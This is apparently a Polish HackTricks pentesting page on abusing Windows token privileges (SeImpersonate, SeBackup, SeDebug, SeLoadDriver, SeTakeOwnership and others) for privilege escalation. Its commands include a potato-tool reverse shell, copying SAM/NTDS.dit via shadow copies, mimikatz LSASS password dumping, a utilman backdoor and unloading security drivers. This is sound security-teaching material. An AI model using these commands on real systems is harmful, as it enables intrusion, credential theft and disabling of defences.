# Nadużywanie tokenów

{{#include ../../banners/hacktricks-training.md}}

## Tokeny

Jeśli **nie wiesz, czym są Windows Access Tokens**, przeczytaj tę stronę, zanim przejdziesz dalej:


{{#ref}}
access-tokens.md
{{#endref}}

**Możesz podnieść uprawnienia, nadużywając tokenów, które już posiadasz.**

### SeImpersonatePrivilege

To uprawnienie pozwala procesowi podszyć się pod inny token (ale nie utworzyć go), gdy proces może uzyskać uchwyt do tego tokenu. Uprzywilejowany token można uzyskać z usługi Windows (DCOM), nakłaniając ją do przeprowadzenia uwierzytelnienia NTLM wobec exploita, co następnie umożliwia uruchomienie procesu z uprawnieniami SYSTEM.<sup>[[2]](#references)</sup> Ten prymityw można wykorzystać za pomocą narzędzi takich jak [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wymaga wyłączenia WinRM), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Aplikacja internetowa dostępna wyłącznie przez loopback może być odrębnym tropem do wymuszenia żądania, jeśli użytkownik lokalny może uzyskać dostęp do uwierzytelnionego endpointu, który wysyła żądanie pod wskazany przez użytkownika adres URL, działając z bardziej uprzywilejowaną tożsamością. Sprawdź autoryzację endpointu i ograniczenia dotyczące adresów URL, rzeczywistą tożsamość klienta wykonującego żądanie wychodzące oraz sposób jego uwierzytelniania, a także to, czy klient może połączyć się z listenerem kontrolowanym przez użytkownika o niższych uprawnieniach. Samo włączone `SeImpersonatePrivilege`, listener IIS lub parametr pobierania adresu URL nie potwierdzają uzyskania uprzywilejowanego tokenu ani istnienia ścieżki eskalacji. Podczas rozpoznania ogranicz się do pasywnego przeglądu; nie wysyłaj żądań wymuszających uwierzytelnienie. Zobacz dokumentację Microsoft dotyczącą [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) i [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Współczesne uwagi dla operatorów:

- **JuicyPotato to przestarzałe narzędzie**: w Windows 10 1809+/Server 2019+ wybierz **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** lub **PrintSpoofer** — zależnie od tego, które interfejsy RPC/COM są nadal dostępne.
- Jeśli przejęta usługa działa jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`**, a `whoami /priv` pokazuje **token filtrowany** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw przywróć **domyślny zestaw uprawnień** konta (na przykład za pomocą **FullPowers**), a następnie ponów próbę z narzędziami z rodziny potato.<sup>[[3]](#references)</sup>
- Niektóre nowsze forki są wygodniejsze dla operatorów niż oryginalne narzędzia. Na przykład **SigmaPotato** obsługuje refleksję/uruchamianie w pamięci i współczesne wersje Windows, a **PrintNotifyPotato** nadużywa usługi COM PrintNotify i często przydaje się, gdy klasyczna ścieżka Spooler jest wyłączona.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege** — używa **tej samej metody**, aby uzyskać uprzywilejowany token.\
Następnie to uprawnienie pozwala **przypisać token podstawowy** nowemu lub wstrzymanemu procesowi. Za pomocą uprzywilejowanego tokenu impersonacji można utworzyć token podstawowy (DuplicateTokenEx).\
Mając token, można utworzyć **nowy proces** za pomocą 'CreateProcessAsUser' albo utworzyć wstrzymany proces i **ustawić token** (ogólnie nie można zmienić tokenu podstawowego działającego procesu).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Jeśli to uprawnienie jest włączone, można użyć **KERB_S4U_LOGON**, aby uzyskać **token impersonacji** dowolnego innego użytkownika bez znajomości jego poświadczeń, **dodać dowolną grupę** (admins) do tokenu, ustawić **poziom integralności** tokenu na "**medium**" i przypisać ten token do **bieżącego wątku** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Dzięki temu uprawnieniu system **przyznaje pełny dostęp do odczytu** dowolnego pliku (ograniczony do operacji odczytu). Jest ono wykorzystywane do **odczytywania skrótów haseł lokalnych kont Administratora** z rejestru. Następnie za pomocą tych skrótów można użyć narzędzi takich jak "**psexec**" lub "**wmiexec**" (technika Pass-the-Hash). Ta technika nie zadziała jednak w dwóch przypadkach: gdy lokalne konto Administratora jest wyłączone albo gdy obowiązuje zasada odbierająca uprawnienia administracyjne lokalnym administratorom łączącym się zdalnie.<sup>[[2]](#references)</sup>\
W praktyce najpewniejszy wbudowany sposób postępowania to zazwyczaj **VSS + `robocopy /b`**: utwórz lub udostępnij kopię w tle, a następnie skopiuj `SAM`/`SYSTEM` lub `NTDS.dit` w **trybie kopii zapasowej**, który omija ACL pliku.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Możesz **nadużyć tego uprawnienia** za pomocą:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- śledząc **IppSec** na [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Lub zgodnie z opisem w sekcji **eskalacja uprawnień przy użyciu Backup Operators**:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

To uprawnienie zapewnia **dostęp do zapisu** do dowolnego pliku systemowego, niezależnie od jego Access Control List (ACL). Otwiera wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, przeprowadzania DLL Hijacking i ustawiania **debuggerów** za pomocą Image File Execution Options, a także stosowania wielu innych technik.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik może podszywać się pod tokeny, ale również wtedy, gdy nie ma SeImpersonatePrivilege. Możliwość ta zależy od tego, czy można podszyć się pod token reprezentujący tego samego użytkownika, którego poziom integralności nie przekracza poziomu integralności bieżącego procesu.<sup>[[2]](#references)</sup>

**Najważniejsze informacje:**

- **Podszywanie się bez SeImpersonatePrivilege:** W określonych warunkach można wykorzystać SeCreateTokenPrivilege do EoP przez podszywanie się pod tokeny.
- **Warunki podszywania się pod token:** Aby podszywanie się powiodło, token docelowy musi należeć do tego samego użytkownika, a jego poziom integralności musi być niższy lub równy poziomowi integralności procesu, który próbuje się pod niego podszyć.
- **Tworzenie i modyfikowanie tokenów podszywania się:** Użytkownicy mogą utworzyć token podszywania się i rozszerzyć jego uprawnienia, dodając SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To uprawnienie pozwala procesowi **ładować i odłączać sterowniki urządzeń** przez utworzenie wpisu rejestru z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni dostęp do zapisu w `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, można zamiast tego użyć `HKCU` (HKEY_CURRENT_USER). Wymagana jest jednak określona ścieżka, aby jądro rozpoznało wpis `HKCU` jako konfigurację sterownika.<sup>[[2]](#references)</sup>

We współczesnych zastosowaniach ofensywnych zwykle stosuje się **BYOVD** (bring your own vulnerable driver): ładuje się **podpisany, ale podatny na ataki** sterownik jądra, a następnie używa jego IOCTL-i do wyłączenia zabezpieczeń lub uzyskania wykonania kodu w jądrze. Należy pamiętać, że w nowszych kompilacjach Windows 11/Server **lista blokowanych podatnych sterowników Microsoftu** i/lub **HVCI/Memory Integrity** często uniemożliwiają korzystanie ze starszych, publicznie znanych łańcuchów exploitów, dlatego klasyczne przykłady w stylu `szkg64.sys` nie są już niezawodne we wszystkich przypadkach.

Ta ścieżka to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` to Relative Identifier bieżącego użytkownika. W `HKCU` należy utworzyć całą tę ścieżkę i ustawić dwie wartości:<sup>[[2]](#references)</sup>

- `ImagePath`, czyli ścieżkę do pliku binarnego, który ma zostać uruchomiony
- `Type` o wartości `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Kroki:**

1. Z powodu ograniczonego dostępu do zapisu użyj `HKCU` zamiast `HKLM`.
2. Utwórz w `HKCU` ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` oznacza Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę do pliku binarnego, który ma zostać uruchomiony.
4. Ustaw `Type` na `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Więcej sposobów nadużywania tego uprawnienia opisano w [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Działa podobnie do **SeRestorePrivilege**. Jego podstawową funkcją jest umożliwienie procesowi **przejęcia własności obiektu**, z pominięciem wymogu uzyskania jawnego dostępu uznaniowego dzięki uprawnieniom WRITE_OWNER. Proces polega najpierw na przejęciu własności docelowego klucza rejestru, aby móc go modyfikować, a następnie na zmianie DACL w celu umożliwienia operacji zapisu.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ten privilege pozwala **debugować inne procesy**, w tym odczytywać i zapisywać ich pamięć. Przy użyciu tego privilege można stosować różne strategie memory injection, które są w stanie ominąć większość rozwiązań antywirusowych i host intrusion prevention.<sup>[[2]](#references)</sup>

W nowoczesnym Windows pamiętaj, że `SeDebugPrivilege` zwykle wystarcza do otwierania **niechronionych procesów SYSTEM** i duplikowania ich tokenów, ale **nie gwarantuje**, że uzyskasz dostęp do **LSASS**. Jeśli włączone są **RunAsPPL / LSA Protection**, niechronione procesy nie mogą odczytywać pamięci LSASS ani wstrzykiwać do niego kodu, nawet jeśli dostępny jest `SeDebugPrivilege`. W takim przypadku przejmij token z innego procesu SYSTEM, który nie korzysta z PPL, albo połącz tę metodę z PPL bypass/BYOVD, zamiast zakładać, że zadziała `procdump`. Przykład kopiowania tokenu z użyciem `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz [na tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Zrzut pamięci

Możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z pakietu [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), aby **zrzucić pamięć procesu**. Dotyczy to między innymi procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie danych uwierzytelniających użytkownika po pomyślnym zalogowaniu się do systemu.

Następnie możesz załadować ten zrzut do mimikatz, aby uzyskać hasła:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Wcześniej zapisany, możliwy do odczytania zrzut LSASS może być dostępny, nawet jeśli bieżące konto nie ma uprawnień do przechwycenia działającego chronionego procesu. Potraktuj plik zrzutu lub archiwum o podobnej nazwie wyłącznie jako wskazówkę: sprawdź dostęp i zawartość, a następnie oceń, czy odzyskane dane uwierzytelniające są nadal ważne i zapewniają kontekst z wyższymi uprawnieniami. Sama nazwa pliku nie dowodzi, że archiwum zawiera zrzut ani że dane uwierzytelniające nadają się do ponownego użycia.

#### RCE

Jeśli chcesz uzyskać shell `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

To uprawnienie (Perform volume maintenance tasks) może umożliwiać uprzywilejowane operacje na woluminach, ale samo w sobie nie gwarantuje dostępu do uchwytu surowego woluminu ani dowolnych plików. Znaczenie mają również ACL urządzeń, stan tokenu, wersja systemu Windows i żądana operacja. Dozwolona operacja sterująca woluminem może zamiast tego zmienić ACL systemu plików; jest to działanie modyfikujące, które może objąć cały wolumin. Na hoście CA nadużycie certyfikatów wymaga również dostępu do użytecznego materiału klucza prywatnego, a pliki chronione przez EFS nadal wymagają autoryzowanego klucza deszyfrującego lub odzyskiwania. Szczegółowe wymagania wstępne opisano poniżej.<sup>[[5]](#references)</sup>

Zobacz szczegółowe techniki i sposoby ograniczania ryzyka:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Sprawdź uprawnienia

```
whoami /priv
```

Tokeny oznaczone jako **Disabled** można zwykle włączyć, więc często można nadużyć zarówno uprawnień _Enabled_, jak i _Disabled_.

### Włącz wszystkie tokeny

Jeśli masz wyłączone uprawnienia, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Albo **skrypt** osadzony w tym [**poście**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Pełna ściągawka uprawnień tokenów dostępna jest pod adresem [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); poniższe podsumowanie zawiera tylko bezpośrednie sposoby wykorzystania uprawnień do uzyskania sesji administratora lub odczytu poufnych plików.<sup>[[1]](#references)</sup>

| Uprawnienie                | Wpływ       | Narzędzie              | Ścieżka wykonania                                                                                                                                                                                                                                                                                                                                   | Uwagi                                                                                                                                                                                                                                                                                                                           |
| -------------------------- | ----------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | narzędzie innej firmy  | _"Pozwala użytkownikowi podszywać się pod tokeny i eskalować uprawnienia do NT system za pomocą narzędzi takich jak potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                | Dziękuję [Aurélien Chalot](https://twitter.com/Defte_) za aktualizację. Wkrótce spróbuję opisać to w formie bardziej przypominającej przepis.                                                                                                                                                                                  |
| **`SeBackup`**             | **Zagrożenie** | _**Wbudowane polecenia**_ | Odczytuj poufne pliki za pomocą `robocopy /b` lub dedykowanych narzędzi do kopiowania obsługujących SeBackup.                                                                                                                                                                                                                                        | <p>- Przydatne w przypadku `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a czasem także `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodne, ale dedykowane cmdlety/API SeBackup często zapewniają większą elastyczność przy plikach zablokowanych lub otwartych.</p> |
| **`SeCreateToken`**        | _**Admin**_ | narzędzie innej firmy  | Utwórz dowolny token, w tym z lokalnymi uprawnieniami administratora, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**         | Zduplikuj token SYSTEM procesu **nieobjętego PPL** lub zrzucaj pamięć procesu niechronionego.                                                                                                                                                                                                                                                        | <p>Zrzut LSASS jest często blokowany, gdy włączona jest funkcja RunAsPPL/LSA Protection.</p><p>Skrypt można znaleźć w [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p> |
| **`SeImpersonate`**        | _**Admin**_ | narzędzie innej firmy  | Użyj **rodziny Potato** / podszywania się przez named pipe, aby uruchomić SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` itd.).                                                                                                                                                                              | <p>Najbardziej praktyczne w przypadku kont usług, takich jak IIS APPPOOL, MSSQL, zaplanowane zadania lub dowolny kontekst, który ma już `SeImpersonatePrivilege`.</p> |
| **`SeLoadDriver`**         | _**Admin**_ | narzędzie innej firmy  | <p>1. Załaduj podpisany, ale podatny sterownik jądra (BYOVD)<br>2. Użyj IOCTL sterownika, aby uzyskać dostęp do odczytu/zapisu jądra, wyłączyć narzędzia bezpieczeństwa lub eskalować uprawnienia do SYSTEM<br><br>Alternatywnie uprawnienie może posłużyć do wyładowania sterowników związanych z bezpieczeństwem za pomocą wbudowanego polecenia <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p> | <p>Starsze publicznie dostępne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane we współczesnych wersjach Windows przez listę blokowanych podatnych sterowników / HVCI.</p> |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**         | <p>1. Uruchom PowerShell/ISE z dostępnym uprawnieniem SeRestore.<br>2. Włącz uprawnienie za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmień nazwę utilman.exe na utilman.old<br>4. Zmień nazwę cmd.exe na utilman.exe<br>5. Zablokuj konsolę i naciśnij Win+U</p> | <p>Niektóre programy antywirusowe mogą wykryć atak.</p><p>Alternatywna metoda polega na podmianie plików binarnych usług znajdujących się w „Program Files” przy użyciu tego samego uprawnienia.</p> |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Wbudowane polecenia**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmień nazwę cmd.exe na utilman.exe<br>4. Zablokuj konsolę i naciśnij Win+U</p>                                                                                                                                        | <p>Niektóre programy antywirusowe mogą wykryć atak.</p><p>Alternatywna metoda polega na podmianie plików binarnych usług znajdujących się w „Program Files” przy użyciu tego samego uprawnienia.</p> |
| **`SeTcb`**                | _**Admin**_ | narzędzie innej firmy  | <p>Zmodyfikuj tokeny tak, aby zawierały lokalne uprawnienia administratora. Może wymagać SeImpersonate.</p><p>Do weryfikacji.</p>                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin – ścieżki eskalacji z uprawnień Windows do administratora](https://github.com/gtworek/Priv2Admin)
- [2] [Nadużywanie uprawnień tokenów w celu LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Oddajcie mi moje uprawnienia! Proszę?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (tryb kopii zapasowej `/b` omija kontrole ACL plików/folderów)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Wykonywanie zadań konserwacji woluminów (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → eksfiltracja klucza CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
